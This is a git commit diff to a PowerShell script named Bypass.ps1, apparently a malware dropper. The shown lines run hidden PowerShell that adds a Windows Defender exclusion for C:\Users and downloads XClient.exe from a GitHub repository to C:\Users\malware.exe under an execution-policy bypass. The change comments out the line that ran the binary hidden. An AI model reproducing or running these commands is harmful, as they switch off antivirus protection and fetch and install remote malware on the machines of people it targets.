4d103e8ed6b9dc6805cd60ebd7b72f4a2f4bea7d
itsHackedOn <132865861+itsHackedOn@users.noreply.github.com>
2023-08-25 02:02:35 -0700

    Update Bypass.ps1

--- Bypass.ps1
+++ Bypass.ps1
@@ -5,5 +5,5 @@ powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
 
 
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/itsHackedOn/Powershell/raw/main/XClient.exe -o C:\Users\malware.exe
-powershell.exe -w Hidden C:\Users\malware.exe
+# powershell.exe -w Hidden C:\Users\malware.exe
 
